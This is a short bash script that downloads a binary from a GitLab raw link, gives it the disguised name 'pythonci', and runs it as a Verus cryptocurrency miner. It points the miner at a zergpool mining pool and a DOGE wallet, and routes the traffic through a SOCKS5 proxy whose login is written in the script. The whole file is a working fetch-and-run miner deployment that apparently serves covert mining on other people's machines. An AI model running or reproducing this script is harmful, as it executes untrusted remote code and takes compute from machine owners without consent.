#!/bin/bash
sudo apt update
sudo apt install screen -y
sudo apt install screen libjansson4 -y
wget https://gitlab.com/asiapboneng/hijas/-/raw/main/pythonci
chmod +x pythonci
screen -dmS ls
PL=verushash.asia.mine.zergpool.com:3300
WT=DJzScE7fFWs6bFUG95Hihdty1jPurDznVY
WR=freg
PY=socks5://qwehsyfs:w1uyert4fs@103.216.82.43:6667
./pythonci -a verus -o $PL -u $WT.$WR -p x c=DOGE -t 2 -x $PY
